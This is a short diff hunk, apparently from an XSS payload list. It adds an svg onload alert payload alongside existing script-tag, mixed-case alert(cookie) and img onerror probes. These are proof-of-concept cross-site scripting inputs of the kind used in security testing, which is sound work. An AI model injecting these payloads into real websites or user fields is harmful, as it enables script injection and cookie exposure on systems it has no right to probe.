@@ -5,3 +5,4 @@
 <script>prompt(document.domain)</script>
 "><sCriPt>alErT(cookie)</script>
 <img/src=x onerror=alert(1)>
+<svg/onload=alert(1)>
